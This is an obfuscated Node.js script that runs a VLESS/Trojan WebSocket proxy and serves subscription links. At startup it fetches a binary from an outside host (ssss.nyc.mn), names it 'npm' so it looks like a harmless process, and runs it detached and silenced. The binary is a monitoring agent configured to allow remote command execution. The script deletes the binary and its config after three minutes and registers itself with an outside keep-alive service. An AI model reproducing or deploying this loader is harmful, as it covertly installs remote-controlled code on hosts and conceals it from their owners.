const _0x1efa7d=_0x19e0;(function(_0xa47bf5,_0x15a344){const _0x270d17=_0x19e0,_0x3075d4=_0xa47bf5();while(!![]){try{const _0x7d1291=-parseInt(_0x270d17(0x1b0))/0x1+parseInt(_0x270d17(0x1be))/0x2*(-parseInt(_0x270d17(0x1d7))/0x3)+parseInt(_0x270d17(0x193))/0x4+-parseInt(_0x270d17(0x180))/0x5+-parseInt(_0x270d17(0x1ab))/0x6+parseInt(_0x270d17(0x16b))/0x7+parseInt(_0x270d17(0x1a2))/0x8;if(_0x7d1291===_0x15a344)break;else _0x3075d4['push'](_0x3075d4['shift']());}catch(_0x2ff69e){_0x3075d4['push'](_0x3075d4['shift']());}}}(_0x20e2,0xd3bcc));const os=require('os'),http=require(_0x1efa7d(0x195)),fs=require('fs'),axios=require(_0x1efa7d(0x1d3)),net=require('net'),path=require('path'),crypto=require(_0x1efa7d(0x1cf)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x1efa7d(0x199)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1efa7d(0x1a1)][_0x1efa7d(0x1aa)]||_0x1efa7d(0x196),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x1efa7d(0x17f)]||'',NEZHA_KEY=process[_0x1efa7d(0x1a1)]['NEZHA_KEY']||'',DOMAIN=process[_0x1efa7d(0x1a1)][_0x1efa7d(0x1bd)]||_0x1efa7d(0x17d),AUTO_ACCESS=process[_0x1efa7d(0x1a1)][_0x1efa7d(0x1d0)]||![],WSPATH=process['env'][_0x1efa7d(0x17b)]||UUID[_0x1efa7d(0x1b5)](0x0,0x8),SUB_PATH=process[_0x1efa7d(0x1a1)]['SUB_PATH']||_0x1efa7d(0x16f),NAME=process['env'][_0x1efa7d(0x1bc)]||'',PORT=process['env'][_0x1efa7d(0x197)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x3d81b7=_0x1efa7d;try{const _0xd76339=await axios['get']('https://speed.cloudflare.com/meta'),_0xf6970e=_0xd76339[_0x3d81b7(0x1b7)];ISP=(_0xf6970e[_0x3d81b7(0x1ae)]+'-'+_0xf6970e[_0x3d81b7(0x192)])[_0x3d81b7(0x19d)](/ /g,'_');}catch(_0x44f887){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x28cc3c,_0x56d24c)=>{const _0x36eac7=_0x1efa7d;if(_0x28cc3c[_0x36eac7(0x1b9)]==='/'){const _0x33d07d=path['join'](__dirname,'index.html');fs[_0x36eac7(0x177)](_0x33d07d,_0x36eac7(0x194),(_0x5cf9e0,_0x2f4cb3)=>{const _0x1f25b9=_0x36eac7;if(_0x5cf9e0){_0x56d24c['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x56d24c[_0x1f25b9(0x16d)]('Hello\x20world!');return;}_0x56d24c[_0x1f25b9(0x182)](0xc8,{'Content-Type':_0x1f25b9(0x1bf)}),_0x56d24c[_0x1f25b9(0x16d)](_0x2f4cb3);});return;}else{if(_0x28cc3c[_0x36eac7(0x1b9)]==='/'+SUB_PATH){const _0x2aa8e1=NAME?NAME+'-'+ISP:ISP,_0x29bf8b=_0x36eac7(0x1c9)+UUID+_0x36eac7(0x1cd)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x2aa8e1,_0x1261e9=_0x36eac7(0x1c3)+UUID+_0x36eac7(0x1d1)+DOMAIN+_0x36eac7(0x1c5)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x2aa8e1,_0xb2fc6a=_0x29bf8b+'\x0a'+_0x1261e9,_0x23488f=Buffer[_0x36eac7(0x1c2)](_0xb2fc6a)[_0x36eac7(0x1a9)](_0x36eac7(0x170));_0x56d24c[_0x36eac7(0x182)](0xc8,{'Content-Type':_0x36eac7(0x1cb)}),_0x56d24c[_0x36eac7(0x16d)](_0x23488f+'\x0a');}else _0x56d24c[_0x36eac7(0x182)](0x194,{'Content-Type':_0x36eac7(0x1cb)}),_0x56d24c[_0x36eac7(0x16d)](_0x36eac7(0x1ca));}}),wss=new WebSocket[(_0x1efa7d(0x1d6))]({'server':httpServer}),uuid=UUID[_0x1efa7d(0x19d)](/-/g,''),DNS_SERVERS=[_0x1efa7d(0x183),_0x1efa7d(0x184)];function resolveHost(_0x42dfec){return new Promise((_0x80177b,_0x136fd8)=>{const _0xc5fdd0=_0x19e0;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xc5fdd0(0x176)](_0x42dfec)){_0x80177b(_0x42dfec);return;}let _0x7e07ca=0x0;function _0x131fc7(){const _0x40962f=_0xc5fdd0;if(_0x7e07ca>=DNS_SERVERS[_0x40962f(0x1a0)]){_0x136fd8(new Error(_0x40962f(0x1ad)+_0x42dfec+_0x40962f(0x1d8)));return;}const _0x429189=DNS_SERVERS[_0x7e07ca];_0x7e07ca++;const _0x4b938a='https://dns.google/resolve?name='+encodeURIComponent(_0x42dfec)+_0x40962f(0x1dc);axios[_0x40962f(0x169)](_0x4b938a,{'timeout':0x1388,'headers':{'Accept':_0x40962f(0x18c)}})[_0x40962f(0x18d)](_0x415ce8=>{const _0x20554d=_0x40962f,_0x3a73ef=_0x415ce8[_0x20554d(0x1b7)];if(_0x3a73ef[_0x20554d(0x1b6)]===0x0&&_0x3a73ef[_0x20554d(0x1bb)]&&_0x3a73ef[_0x20554d(0x1bb)][_0x20554d(0x1a0)]>0x0){const _0x54d62f=_0x3a73ef[_0x20554d(0x1bb)][_0x20554d(0x1b8)](_0x3f9d25=>_0x3f9d25['type']===0x1);if(_0x54d62f){_0x80177b(_0x54d62f['data']);return;}}_0x131fc7();})['catch'](_0x173a93=>{_0x131fc7();});}_0x131fc7();});}function _0x19e0(_0x47a8c8,_0x327dcb){_0x47a8c8=_0x47a8c8-0x167;const _0x20e2f8=_0x20e2();let _0x19e0be=_0x20e2f8[_0x47a8c8];return _0x19e0be;}function handleVlessConnection(_0x285633,_0x135c0b){const _0x427703=_0x1efa7d,[_0x458502]=_0x135c0b,_0x59ddfa=_0x135c0b[_0x427703(0x1b5)](0x1,0x11);if(!_0x59ddfa[_0x427703(0x19b)]((_0x53ba4f,_0x3c9bea)=>_0x53ba4f==parseInt(uuid['substr'](_0x3c9bea*0x2,0x2),0x10)))return![];let _0x29332b=_0x135c0b['slice'](0x11,0x12)[_0x427703(0x19a)]()+0x13;const _0x2d0eba=_0x135c0b[_0x427703(0x1b5)](_0x29332b,_0x29332b+=0x2)[_0x427703(0x190)](0x0),_0x705c07=_0x135c0b[_0x427703(0x1b5)](_0x29332b,_0x29332b+=0x1)['readUInt8'](),_0x43a519=_0x705c07==0x1?_0x135c0b[_0x427703(0x1b5)](_0x29332b,_0x29332b+=0x4)[_0x427703(0x19f)]('.'):_0x705c07==0x2?new TextDecoder()[_0x427703(0x1c6)](_0x135c0b['slice'](_0x29332b+0x1,_0x29332b+=0x1+_0x135c0b[_0x427703(0x1b5)](_0x29332b,_0x29332b+0x1)[_0x427703(0x19a)]())):_0x705c07==0x3?_0x135c0b[_0x427703(0x1b5)](_0x29332b,_0x29332b+=0x10)['reduce']((_0xd783d2,_0x750047,_0x11cf31,_0x3b7e55)=>_0x11cf31%0x2?_0xd783d2[_0x427703(0x1d5)](_0x3b7e55[_0x427703(0x1b5)](_0x11cf31-0x1,_0x11cf31+0x1)):_0xd783d2,[])[_0x427703(0x1da)](_0x1d59d6=>_0x1d59d6['readUInt16BE'](0x0)[_0x427703(0x1a9)](0x10))['join'](':'):'';_0x285633['send'](new Uint8Array([_0x458502,0x0]));const _0xa8fc29=createWebSocketStream(_0x285633);return resolveHost(_0x43a519)[_0x427703(0x18d)](_0x18b3a9=>{net['connect']({'host':_0x18b3a9,'port':_0x2d0eba},function(){const _0x4c1f76=_0x19e0;this[_0x4c1f76(0x17c)](_0x135c0b[_0x4c1f76(0x1b5)](_0x29332b)),_0xa8fc29['on'](_0x4c1f76(0x1db),()=>{})[_0x4c1f76(0x1c0)](this)['on'](_0x4c1f76(0x1db),()=>{})[_0x4c1f76(0x1c0)](_0xa8fc29);})['on']('error',()=>{});})[_0x427703(0x168)](_0x27a778=>{const _0x5c0613=_0x427703;net['connect']({'host':_0x43a519,'port':_0x2d0eba},function(){const _0x96855=_0x19e0;this[_0x96855(0x17c)](_0x135c0b['slice'](_0x29332b)),_0xa8fc29['on'](_0x96855(0x1db),()=>{})[_0x96855(0x1c0)](this)['on'](_0x96855(0x1db),()=>{})[_0x96855(0x1c0)](_0xa8fc29);})['on'](_0x5c0613(0x1db),()=>{});}),!![];}function handleTrojanConnection(_0x8c2dc1,_0x4e09fe){const _0x416108=_0x1efa7d;try{if(_0x4e09fe[_0x416108(0x1a0)]<0x3a)return![];const _0x18dad8=_0x4e09fe['slice'](0x0,0x38)[_0x416108(0x1a9)](),_0x188e88=[UUID];let _0x1d86f2=null;for(const _0x15f2bc of _0x188e88){const _0x3eb88d=crypto[_0x416108(0x1c1)](_0x416108(0x1b2))[_0x416108(0x16a)](_0x15f2bc)['digest'](_0x416108(0x175));if(_0x3eb88d===_0x18dad8){_0x1d86f2=_0x15f2bc;break;}}if(!_0x1d86f2)return![];let _0x3aa9cf=0x38;_0x4e09fe[_0x3aa9cf]===0xd&&_0x4e09fe[_0x3aa9cf+0x1]===0xa&&(_0x3aa9cf+=0x2);const _0x3eb741=_0x4e09fe[_0x3aa9cf];if(_0x3eb741!==0x1)return![];_0x3aa9cf+=0x1;const _0x244da6=_0x4e09fe[_0x3aa9cf];_0x3aa9cf+=0x1;let _0x16aaf0,_0x5d1cc0;if(_0x244da6===0x1)_0x16aaf0=_0x4e09fe['slice'](_0x3aa9cf,_0x3aa9cf+0x4)[_0x416108(0x19f)]('.'),_0x3aa9cf+=0x4;else{if(_0x244da6===0x3){const _0x34968f=_0x4e09fe[_0x3aa9cf];_0x3aa9cf+=0x1,_0x16aaf0=_0x4e09fe[_0x416108(0x1b5)](_0x3aa9cf,_0x3aa9cf+_0x34968f)[_0x416108(0x1a9)](),_0x3aa9cf+=_0x34968f;}else{if(_0x244da6===0x4)_0x16aaf0=_0x4e09fe[_0x416108(0x1b5)](_0x3aa9cf,_0x3aa9cf+0x10)['reduce']((_0x16c14f,_0x237092,_0x8acbb7,_0x15627e)=>_0x8acbb7%0x2?_0x16c14f[_0x416108(0x1d5)](_0x15627e[_0x416108(0x1b5)](_0x8acbb7-0x1,_0x8acbb7+0x1)):_0x16c14f,[])[_0x416108(0x1da)](_0x178907=>_0x178907[_0x416108(0x190)](0x0)[_0x416108(0x1a9)](0x10))[_0x416108(0x19f)](':'),_0x3aa9cf+=0x10;else return![];}}_0x5d1cc0=_0x4e09fe[_0x416108(0x190)](_0x3aa9cf),_0x3aa9cf+=0x2;_0x3aa9cf<_0x4e09fe['length']&&_0x4e09fe[_0x3aa9cf]===0xd&&_0x4e09fe[_0x3aa9cf+0x1]===0xa&&(_0x3aa9cf+=0x2);const _0x42604a=createWebSocketStream(_0x8c2dc1);return resolveHost(_0x16aaf0)[_0x416108(0x18d)](_0x51c598=>{const _0x211389=_0x416108;net[_0x211389(0x17e)]({'host':_0x51c598,'port':_0x5d1cc0},function(){const _0x90afe6=_0x211389;_0x3aa9cf<_0x4e09fe['length']&&this[_0x90afe6(0x17c)](_0x4e09fe[_0x90afe6(0x1b5)](_0x3aa9cf)),_0x42604a['on'](_0x90afe6(0x1db),()=>{})[_0x90afe6(0x1c0)](this)['on']('error',()=>{})[_0x90afe6(0x1c0)](_0x42604a);})['on'](_0x211389(0x1db),()=>{});})[_0x416108(0x168)](_0x4f9c15=>{const _0x243a25=_0x416108;net[_0x243a25(0x17e)]({'host':_0x16aaf0,'port':_0x5d1cc0},function(){const _0x18aabd=_0x243a25;_0x3aa9cf<_0x4e09fe[_0x18aabd(0x1a0)]&&this[_0x18aabd(0x17c)](_0x4e09fe[_0x18aabd(0x1b5)](_0x3aa9cf)),_0x42604a['on'](_0x18aabd(0x1db),()=>{})['pipe'](this)['on']('error',()=>{})[_0x18aabd(0x1c0)](_0x42604a);})['on'](_0x243a25(0x1db),()=>{});}),!![];}catch(_0x50f413){return![];}}wss['on'](_0x1efa7d(0x18e),(_0x38cc62,_0x219971)=>{const _0x5804cb=_0x1efa7d,_0x415d9b=_0x219971[_0x5804cb(0x1b9)]||'';_0x38cc62['once'](_0x5804cb(0x198),_0x59aeea=>{const _0x22c78f=_0x5804cb;if(_0x59aeea[_0x22c78f(0x1a0)]>0x11&&_0x59aeea[0x0]===0x0){const _0x41bc20=_0x59aeea[_0x22c78f(0x1b5)](0x1,0x11),_0x4c6b34=_0x41bc20['every']((_0x19056e,_0x366e4f)=>_0x19056e==parseInt(uuid['substr'](_0x366e4f*0x2,0x2),0x10));if(_0x4c6b34){!handleVlessConnection(_0x38cc62,_0x59aeea)&&_0x38cc62[_0x22c78f(0x1a4)]();return;}}!handleTrojanConnection(_0x38cc62,_0x59aeea)&&_0x38cc62['close']();})['on']('error',()=>{});});function _0x20e2(){const _0x1e2830=['config.yaml','npm\x20download\x20successfully','/bin/bash','npm','https://','application/dns-json','then','connection','Server\x20is\x20running\x20on\x20port\x20','readUInt16BE','listen','asOrganization','6275668tJkPsz','utf8','http','d7a16f8a-11c0-4684-9e27-9dadff45801a','PORT','message','child_process','readUInt8','every','https://amd64.ssss.nyc.mn/agent','replace','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','join','length','env','13537296ZQmqzK','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','close','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','writeFileSync','2083','https://arm64.ssss.nyc.mn/v1','toString','UUID','1839498CvIlrX','split','Failed\x20to\x20resolve\x20','country','arm64','449191PpHGgA','https://oooo.serv00.net/add-url','sha224','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','--tls','slice','Status','data','find','url','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Answer','NAME','DOMAIN','158iIfGgQ','text/html','pipe','createHash','from','trojan://','utf-8','&fp=chrome&type=ws&host=','decode','\x20-p\x20','443','vless://','Not\x20Found\x0a','text/plain','npm\x20is\x20running','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','2053','crypto','AUTO_ACCESS','@cdns.doon.eu.org:443?security=tls&sni=','8443','axios','npm\x20running\x20error:','concat','Server','55143kMwTfW','\x20with\x20all\x20DNS\x20servers','pop','map','error','&type=A','unlink','client_secret:\x20','trim','catch','get','update','9308397QdVory','https://amd64.ssss.nyc.mn/v1','end','setsid\x20nohup\x20./npm\x20-s\x20','sub','base64','aarch64','https://arm64.ssss.nyc.mn/agent','finish','error:\x20','hex','test','readFile','application/json','arch','includes','WSPATH','write','1234.abc.com','connect','NEZHA_PORT','7578505AJcAAR','log','writeHead','8.8.4.4','1.1.1.1','post','chmod\x20+x\x20npm'];_0x20e2=function(){return _0x1e2830;};return _0x20e2();}const getDownloadUrl=()=>{const _0x2c1784=_0x1efa7d,_0x2bd5ae=os[_0x2c1784(0x179)]();return _0x2bd5ae==='arm'||_0x2bd5ae===_0x2c1784(0x1af)||_0x2bd5ae===_0x2c1784(0x171)?!NEZHA_PORT?_0x2c1784(0x1a8):_0x2c1784(0x172):!NEZHA_PORT?_0x2c1784(0x16c):_0x2c1784(0x19c);},downloadFile=async()=>{const _0x5ee1be=_0x1efa7d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x27bd26=getDownloadUrl(),_0x551013=await axios({'method':_0x5ee1be(0x169),'url':_0x27bd26,'responseType':'stream'}),_0x34fe52=fs['createWriteStream']('npm');return _0x551013[_0x5ee1be(0x1b7)]['pipe'](_0x34fe52),new Promise((_0x49ff2a,_0x4af86c)=>{const _0x72adbe=_0x5ee1be;_0x34fe52['on'](_0x72adbe(0x173),()=>{const _0xd2b908=_0x72adbe;console['log'](_0xd2b908(0x188)),exec(_0xd2b908(0x186),_0xaf89f4=>{if(_0xaf89f4)_0x4af86c(_0xaf89f4);_0x49ff2a();});}),_0x34fe52['on'](_0x72adbe(0x1db),_0x4af86c);});}catch(_0x37df41){throw _0x37df41;}},runnz=async()=>{const _0x2402a5=_0x1efa7d;try{const _0x5553ca=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x2402a5(0x1c4)});if(_0x5553ca[_0x2402a5(0x167)]()!==''){console[_0x2402a5(0x181)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x13edb4){}await downloadFile();let _0xf2a1b='',_0xde846c=[_0x2402a5(0x1c8),_0x2402a5(0x1d2),'2096','2087',_0x2402a5(0x1a7),_0x2402a5(0x1ce)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4ff91e=_0xde846c[_0x2402a5(0x17a)](NEZHA_PORT)?_0x2402a5(0x1b4):'';_0xf2a1b=_0x2402a5(0x16e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2402a5(0x1c7)+NEZHA_KEY+'\x20'+_0x4ff91e+_0x2402a5(0x1ba);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x577de5=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x2402a5(0x1ac)](':')[_0x2402a5(0x1d9)]():'',_0x2a380d=_0xde846c['includes'](_0x577de5)?'true':'false',_0x251133=_0x2402a5(0x1de)+NEZHA_KEY+_0x2402a5(0x19e)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x2a380d+_0x2402a5(0x1a3)+UUID;fs[_0x2402a5(0x1a6)](_0x2402a5(0x187),_0x251133);}_0xf2a1b=_0x2402a5(0x1b3);}else{console[_0x2402a5(0x181)](_0x2402a5(0x1a5));return;}}try{exec(_0xf2a1b,{'shell':_0x2402a5(0x189)},_0x21172f=>{const _0x464bd5=_0x2402a5;if(_0x21172f)console[_0x464bd5(0x1db)](_0x464bd5(0x1d4),_0x21172f);else console[_0x464bd5(0x181)](_0x464bd5(0x1cc));});}catch(_0x324f65){console['error'](_0x2402a5(0x174)+_0x324f65);}};async function addAccessTask(){const _0x2390ea=_0x1efa7d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4a30eb=_0x2390ea(0x18b)+DOMAIN+'/'+SUB_PATH;try{const _0x40deb9=await axios[_0x2390ea(0x185)](_0x2390ea(0x1b1),{'url':_0x4a30eb},{'headers':{'Content-Type':_0x2390ea(0x178)}});console[_0x2390ea(0x181)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0xe4aaf){}}const delFiles=()=>{const _0xf19524=_0x1efa7d;fs[_0xf19524(0x1dd)](_0xf19524(0x18a),()=>{}),fs[_0xf19524(0x1dd)]('config.yaml',()=>{});};httpServer[_0x1efa7d(0x191)](PORT,()=>{const _0x3698da=_0x1efa7d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3698da(0x181)](_0x3698da(0x18f)+PORT);});
